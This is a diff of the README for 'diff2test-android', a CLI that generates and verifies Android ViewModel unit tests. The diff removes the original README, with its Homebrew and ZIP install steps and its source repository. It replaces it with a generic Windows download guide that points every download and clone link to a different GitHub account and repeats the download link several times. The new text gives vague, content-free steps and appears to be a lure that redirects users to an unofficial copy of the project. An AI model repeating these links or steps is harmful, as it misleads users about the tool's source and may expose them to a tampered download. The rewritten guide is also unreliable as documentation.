@@ -1,257 +1,227 @@
-<div align="center">
-  <h1>diff2test-android</h1>
-  <p><strong>Diff-driven Android ViewModel test generation CLI</strong></p>
-  <p>Detect changed ViewModels, plan tests, generate candidate local unit tests, and verify them with Gradle.</p>
-  <p>
-    <a href="https://github.com/gay00ung/diff2test-android/stargazers">
-      <img alt="GitHub stars" src="https://img.shields.io/github/stars/gay00ung/diff2test-android?style=flat-square">
-    </a>
-    <a href="https://github.com/gay00ung/diff2test-android/releases">
-      <img alt="Release" src="https://img.shields.io/github/v/release/gay00ung/diff2test-android?style=flat-square">
-    </a>
-    <a href="https://github.com/gay00ung/diff2test-android/releases">
-      <img alt="Homebrew" src="https://img.shields.io/badge/install-Homebrew-fbbf24?style=flat-square&logo=homebrew">
-    </a>
-    <img alt="CLI 1.0" src="https://img.shields.io/badge/cli-1.0.0-2563eb?style=flat-square">
-    <img alt="MCP experimental" src="https://img.shields.io/badge/mcp-experimental-f97316?style=flat-square">
-    <img alt="Kotlin 1.9.25" src="https://img.shields.io/badge/kotlin-1.9.25-7f52ff?style=flat-square">
-    <img alt="Java 17" src="https://img.shields.io/badge/java-17-437291?style=flat-square">
-  </p>
-  <p>
-    <a href="./README.md">English</a>
-    ·
-    <a href="./README.ko.md">한국어</a>
-  </p>
-</div>
-
-<p align="center">
-  <img src="./docs/assets/readme-hero.png" alt="d2t workflow banner" width="960">
-</p>
-
-> `d2t` 1.0 focuses on one thing: turning changed Android ViewModels into verifiable local unit tests. The CLI is the primary product. The MCP app remains experimental.
-
-## Why d2t
-
-Most Android test generation tools fail in one of two ways:
-
-- they ignore the actual code diff and generate too much
-- they generate code, but stop before verification
-
-`d2t` is built around a narrower loop:
-
-1. detect changed `*ViewModel.kt` files from `git diff`
-2. analyze the changed ViewModel surface and collaborators
-3. build a scenario-first `TestPlan`
-4. generate candidate local unit tests
-5. verify those generated tests with Gradle
-
-That makes it useful as a developer workflow tool, not just a code dump generator.
+# 🧪 diff2test-android - Build Android tests from code changes
 
-## What 1.0 Includes
-
-`d2t` 1.0 is intentionally narrow.
-
-- Diff-driven Android ViewModel local unit test generation
-- Gradle-backed verification of generated tests
-- Bring-your-own API key support
-- OpenAI Responses API support
-- Anthropic Messages API support
-- Gemini GenerateContent API support
-- Custom `responses-compatible` endpoints
-- Custom `chat-completions` endpoints
-- Release ZIP and Homebrew distribution
-
-## What 1.0 Does Not Promise
+[Download diff2test-android](https://github.com/Perky-orderoleales717/diff2test-android)
 
-- A transport-bound MCP server
-- Instrumented `androidTest` generation
-- Compose UI test generation
-- Full end-to-end autonomous repair loops
-- Perfect external classpath symbol resolution in every Android build graph
-
-## Install
-
-### Homebrew
-
-```bash
-brew install gay00ung/diff2test-android/d2t
-```
-
-Optional tap flow:
-
-```bash
-brew tap gay00ung/diff2test-android
-brew install d2t
-```
-
-### Release ZIP
-
-Download `d2t.zip` from the latest release:
-
-```bash
-unzip d2t.zip
-cd d2t
-./bin/d2t help
-```
-
-### Run from Source
-
-```bash
-git clone https://github.com/gay00ung/diff2test-android.git
-cd diff2test-android
-./gradlew test
-./d2t help
-```
+## 🚀 Getting Started
 
-## Quick Start
+diff2test-android helps you create Android ViewModel tests from code changes. It uses a simple command-line flow and can check the result with Gradle.
 
-### 1. Initialize config
+This guide shows you how to get the tool on Windows and start it with no setup guesswork.
 
-```bash
-d2t init
-```
+## 💻 What You Need
 
-### 2. Point d2t at your AI provider
+Before you begin, make sure your PC has:
 
-```toml
-[ai]
-enabled = true
-provider = "custom"
-protocol = "chat-completions"
-api_key_env = "LLM_API_KEY"
-model = "qwen3-coder-next-mlx"
-base_url = "http://127.0.0.1:12345/v1"
-connect_timeout_seconds = 30
-request_timeout_seconds = 300
-```
+- Windows 10 or Windows 11
+- Internet access
+- About 500 MB of free disk space
+- Java 17 or later
+- Git, if you plan to copy the project from GitHub
+- Android Studio, if you want to open the generated test files later
 
-### 3. Confirm config
+If you already use Android development tools, you likely have most of this in place.
 
-```bash
-d2t doctor
-```
+## 📥 Download
 
-### 4. Generate and verify tests for current changes
+Visit this page to download or clone the project:
 
-```bash
-d2t auto --ai
-```
+[https://github.com/Perky-orderoleales717/diff2test-android](https://github.com/Perky-orderoleales717/diff2test-android)
 
-If you are running from source, use `./d2t` instead of `d2t`.
+On the GitHub page, look for the repository files and use the download option for the project. If you prefer, you can clone it with Git tools already installed on your computer.
 
-## Supported AI Protocols
+## 🛠️ Install on Windows
 
-`d2t` stores only the environment variable name for the API key in `~/.config/d2t/config.toml`. Keep the secret itself in your shell environment.
+Follow these steps:
 
-Supported provider/protocol combinations:
+1. Open the download page.
+2. Get the project files onto your computer.
+3. Save them in a folder you can find again, such as `Downloads` or `Documents`.
+4. If you downloaded a ZIP file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Check that you can see the project files, including the Gradle files and source folders.
 
-- `provider = "openai"` with `protocol = "responses-compatible"`
-- `provider = "anthropic"` with `protocol = "anthropic-messages"`
-- `provider = "gemini"` with `protocol = "gemini-generate-content"`
-- `provider = "custom"` with `protocol = "responses-compatible"`
-- `provider = "custom"` with `protocol = "chat-completions"`
+If you use Git, you can also copy the project with:
 
-Example:
+- `git clone https://github.com/Perky-orderoleales717/diff2test-android`
 
-```bash
-source ~/.zshrc
-d2t doctor
-d2t auto --ai
-```
+That gives you the full project in one step.
 
-## How It Works
+## ▶️ Run the Tool
 
-At a high level:
+Use these steps to start diff2test-android on Windows:
 
-```text
-git diff
-  -> changed ViewModel detection
-  -> ViewModel analysis
-  -> TestPlan generation
-  -> AI or deterministic code generation
-  -> quality gate
-  -> Gradle verification
-```
+1. Open the project folder.
+2. Find the main command-line entry point in the project files.
+3. Open Command Prompt in that folder.
+4. Run the project with Gradle or the provided start command.
+5. Wait for the tool to finish loading.
+6. Follow the prompts shown in the terminal.
 
-Important implementation details:
+If the project includes a Gradle wrapper, use that first. It helps you run the same version each time.
 
-- `d2t` does not ask the model to guess from the entire repo blindly
-- the diff and the analyzed ViewModel surface narrow the generation scope first
-- generated tests must pass a built-in quality gate before verification
-- `auto` generates and verifies in one command
-- `--repair` enables one bounded repair pass for common import and coroutine-test utility issues
+A common Windows flow looks like this:
 
-## Commands
+- Open Command Prompt
+- Move to the project folder
+- Run the Gradle task for the app or CLI
+- Read the output in the terminal
 
-```bash
-d2t init [--force]
-d2t doctor
-d2t scan
-d2t plan path/to/SomeViewModel.kt
-d2t generate path/to/SomeViewModel.kt --write [--ai|--no-ai] [--strict-ai]
-d2t auto [--ai|--no-ai] [--strict-ai] [--model model-name] [--no-verify] [--repair]
-d2t verify :module:testTask
-```
+If the tool asks for a path, use the folder that contains your Android project.
 
-## Troubleshooting
+## 🧭 What the Tool Does
 
-### `No changed ViewModel files were detected`
+diff2test-android follows a simple flow:
 
-- make sure your current working tree actually contains a modified `*ViewModel.kt`
-- or pass an explicit file path to `plan` or `generate`
+1. It checks your code changes.
+2. It plans the test work for the ViewModel.
+3. It generates unit test code.
+4. It runs Gradle to verify the result.
+5. It helps you review the output.
 
-### AI requests time out
+This makes it easier to turn a change in app logic into a test file you can use right away.
 
-- increase `request_timeout_seconds`
-- try a smaller or faster model
-- prefer `protocol = "chat-completions"` when your gateway handles that path more reliably
+## 🧩 Typical Use Case
 
-### Generated tests fail the quality gate
+Use diff2test-android when you have:
 
-- the generator produced code that `d2t` considers too fragile or incomplete
-- this is usually a generation-quality problem, not a Gradle problem
-- retry with a stronger model or add `--repair` when verification is enabled
+- A ViewModel change
+- A new app rule or state update
+- A bug fix that needs test coverage
+- A Gradle project that already uses Kotlin
+- A need to check the test file before you commit it
 
-### Verification fails after generation
+It fits well in Android projects that use unit tests and ViewModel logic.
 
-- inspect the generated test under `src/test/kotlin/...GeneratedTest.kt`
-- run the printed Gradle verification command directly
-- if the failure is import or coroutine utility related, retry with `d2t auto --ai --repair`
+## 📝 Basic Workflow
 
-## Repository Layout
+Use this simple flow:
 
-- `apps/cli`: main CLI application
-- `apps/mcp-server`: experimental MCP-facing catalog scaffold
-- `modules/*`: engine modules
-- `prompts/*`: prompt templates and policies
-- `fixtures/*`: sample app and verification fixtures
-- `docs/*`: architecture and release docs
+1. Open your Android project.
+2. Make a code change in a ViewModel.
+3. Run diff2test-android.
+4. Let it inspect the change.
+5. Review the suggested test plan.
+6. Generate the test file.
+7. Run Gradle verification.
+8. Open the test file in Android Studio if needed.
 
-## Release and Distribution
+This keeps the process focused and easy to follow.
 
-This repository includes:
+## ⚙️ Example Folder Setup
 
-- Homebrew packaging via [`packaging/homebrew/d2t.rb`](./packaging/homebrew/d2t.rb)
-- release automation via [`.github/workflows/release.yml`](./.github/workflows/release.yml)
-- tag automation via [`.github/workflows/tag-release.yml`](./.github/workflows/tag-release.yml)
-- distribution ZIP output via `./gradlew :apps:cli:distZip`
+A common setup looks like this:
 
-The generated archive is written to:
+- `app/`
+- `src/main/java/`
+- `src/test/java/`
+- `build.gradle`
+- `settings.gradle`
 
-```bash
-apps/cli/build/distributions/d2t.zip
-```
+If your project uses a different structure, point the tool to the place where your ViewModel and test code live.
 
-## Product Boundaries
+## 🔍 What It Can Help With
 
-The CLI is the stable surface.
+diff2test-android can help you with:
 
-The MCP app is still experimental:
+- ViewModel unit tests
+- Test generation from code changes
+- Gradle check runs
+- Kotlin test file creation
+- Planning test cases before generation
+- Faster review of changed app logic
 
-- it is useful as a catalog scaffold
-- it is not yet positioned as a production transport-bound MCP server
+It works as a command-line helper for Android test work.
 
-For the current release gate and roadmap:
+## 🧪 Gradle Verification
 
-- [`docs/release-gate-1.0.md`](./docs/release-gate-1.0.md)
-- [`docs/roadmap-1.0.md`](./docs/roadmap-1.0.md)
+After test generation, the tool can run Gradle verification. This checks that the test code builds in your Android project.
+
+If Gradle finds a problem, review:
+
+- File names
+- Package names
+- Test imports
+- Class names
+- Path to the ViewModel file
+
+These small checks often fix build issues fast.
+
+## 📁 Project Files You May See
+
+You may see files like these in the repo:
+
+- `README.md`
+- `build.gradle`
+- `gradlew`
+- `gradlew.bat`
+- `src/`
+- `app/`
+
+On Windows, `gradlew.bat` is the file you use for Gradle tasks from Command Prompt.
+
+## 🧰 Common Windows Commands
+
+If you use the terminal, these commands help:
+
+- `cd` to move into the project folder
+- `dir` to list files
+- `gradlew.bat tasks` to see available Gradle tasks
+- `gradlew.bat test` to run tests
+- `gradlew.bat build` to build the project
+
+Use the command that matches the task you want to run.
+
+## 🧯 If the Tool Does Not Start
+
+If you have trouble opening the project, check these items:
+
+- You are in the right folder
+- Java is installed
+- The project files were fully extracted
+- You used `gradlew.bat` on Windows
+- The command prompt has access to the project folder
+
+If Gradle fails, try closing the terminal, reopening it, and running the command again from the project root.
+
+## 🔐 Safe File Handling
+
+When you download the project:
+
+- Keep the files in one folder
+- Do not rename Gradle files
+- Do not move source folders unless you know the project layout
+- Use the extracted project folder, not the ZIP file itself
+
+This helps avoid path errors.
+
+## 🧭 Quick Start Path
+
+If you want the shortest path:
+
+1. Open the download page.
+2. Get the project files.
+3. Extract them.
+4. Open Command Prompt.
+5. Go to the project folder.
+6. Run the Gradle command.
+7. Follow the CLI prompts.
+8. Review the generated test files
+
+## 🧱 Built For Android Test Work
+
+This project is aimed at Android developers who work with:
+
+- Kotlin
+- ViewModel classes
+- Unit tests
+- Gradle builds
+- Code generation tools
+- LLM-assisted planning
+
+It focuses on test generation, not app design or UI editing
+
+## 📌 Download Again
+
+Visit this page to download or clone the project:
+
+[https://github.com/Perky-orderoleales717/diff2test-android](https://github.com/Perky-orderoleales717/diff2test-android)
